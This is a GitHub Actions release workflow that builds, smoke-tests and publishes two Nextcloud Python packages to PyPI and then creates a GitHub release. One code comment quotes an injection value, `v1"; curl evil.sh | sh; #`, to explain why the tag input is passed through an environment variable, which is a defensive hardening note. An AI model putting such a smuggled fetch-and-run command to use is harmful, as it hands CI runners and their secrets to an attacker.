name: Release

on:
  push:
    tags:
      - v*
  workflow_call:
    inputs:
      tag:
        description: 'The tag to release (e.g. v0.70.2)'
        required: true
        type: string

jobs:
  # Mirrors docker-build-publish.yml: the tag comes from the workflow_call input
  # when bump-version.yml drives the release, and from the ref when a tag is
  # pushed by hand.
  resolve-tag:
    runs-on: ubuntu-latest
    # Branches on a string and never touches the token; scope it down explicitly
    # like the two jobs below rather than inheriting the caller's grant.
    permissions: {}
    outputs:
      tag: ${{ steps.resolve.outputs.tag }}
    steps:
      - name: Resolve tag
        id: resolve
        # INPUT_TAG is caller-controlled, so it goes through the environment
        # rather than being interpolated into the script body, where a tag like
        # `v1"; curl evil.sh | sh; #` would execute (githubactions:S7630).
        env:
          INPUT_TAG: ${{ inputs.tag }}
        run: |
          if [ -n "$INPUT_TAG" ]; then
            TAG="$INPUT_TAG"
          else
            TAG="${GITHUB_REF#refs/tags/}"
          fi
          echo "tag=$TAG" >> $GITHUB_OUTPUT

  pypi:
    name: Publish to PyPI
    needs: resolve-tag
    runs-on: ubuntu-latest
    # Environment and permissions trusted publishing.
    environment:
      # Create this environment in the GitHub repository under Settings -> Environments
      name: pypi
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Checkout
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          ref: ${{ needs.resolve-tag.outputs.tag }}

      - name: Install uv
        uses: astral-sh/setup-uv@68559e99cc807c1eb7e9238fd43a15bba460eec2 # v10.3.3
      - name: Install Python 3.11
        run: uv python install 3.11
      # Both workspace packages, released in lockstep: the server pins
      # nextcloud-client==<this version>.
      - name: Build
        run: uv build --all-packages
      # --find-links: the pinned nextcloud-client is the one just built, which
      # is not on PyPI until the publish step below.
      - name: Smoke test (wheel)
        run: uv run --isolated --no-project --no-build --find-links dist --with dist/nextcloud_mcp_server-*.whl nextcloud-mcp-server --help
      - name: Smoke test (source distribution)
        run: uv run --isolated --no-project --find-links dist --with dist/nextcloud_mcp_server-*.tar.gz nextcloud-mcp-server --help
      # Same check as package-smoke: the client wheel installs alone and brings
      # none of the server's stack with it.
      - name: Smoke test (nextcloud-client wheel)
        # python -I: otherwise the checkout root is on sys.path and the source
        # tree's nextcloud_mcp_server/ counts as a leak.
        run: |
          wheel=$(ls dist/nextcloud_client-*.whl)
          uv run --isolated --no-project --no-build --with "./$wheel" python -I -c "
          import importlib.util as u
          import nextcloud_client
          leaked = [m for m in ('nextcloud_mcp_server', 'mcp', 'dynaconf', 'prometheus_client', 'sqlalchemy') if u.find_spec(m)]
          assert not leaked, leaked
          "
      # Client first: the server pins nextcloud-client==<this version>, so a
      # server published without its client is uninstallable from PyPI. If the
      # client upload fails, the job stops before the server goes out. Trusted
      # publishing must be configured for both PyPI projects.
      #
      # --check-url skips files PyPI already has, so re-running a release whose
      # client went out but whose server upload failed retries only the server.
      - name: Publish nextcloud-client
        run: uv publish --check-url https://pypi.org/simple/ dist/nextcloud_client-*
      - name: Publish nextcloud-mcp-server
        run: uv publish --check-url https://pypi.org/simple/ dist/nextcloud_mcp_server-*

  github-release:
    name: Create GitHub Release
    # Gated on pypi: a Release announcing a version that failed to publish would
    # point users at an install that does not exist.
    needs: [resolve-tag, pypi]
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - name: Checkout
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          ref: ${{ needs.resolve-tag.outputs.tag }}

      # The bump commit that the tag points at is the one commitizen wrote the
      # CHANGELOG entry in, so the section is always present at this ref.
      - name: Build release notes
        env:
          TAG: ${{ needs.resolve-tag.outputs.tag }}
        run: |
          set -euo pipefail
          ./scripts/extract-changelog.sh "$TAG" > notes.md
          echo "Release notes for $TAG:"
          cat notes.md

      # `gh release create` fails if the release already exists (e.g. a re-run of
      # this job), so check first and update instead.
      - name: Create release
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TAG: ${{ needs.resolve-tag.outputs.tag }}
        run: |
          set -euo pipefail
          if gh release view "$TAG" >/dev/null 2>&1; then
            echo "Release $TAG already exists; updating notes."
            gh release edit "$TAG" --notes-file notes.md
          else
            gh release create "$TAG" --title "$TAG" --notes-file notes.md --verify-tag
          fi
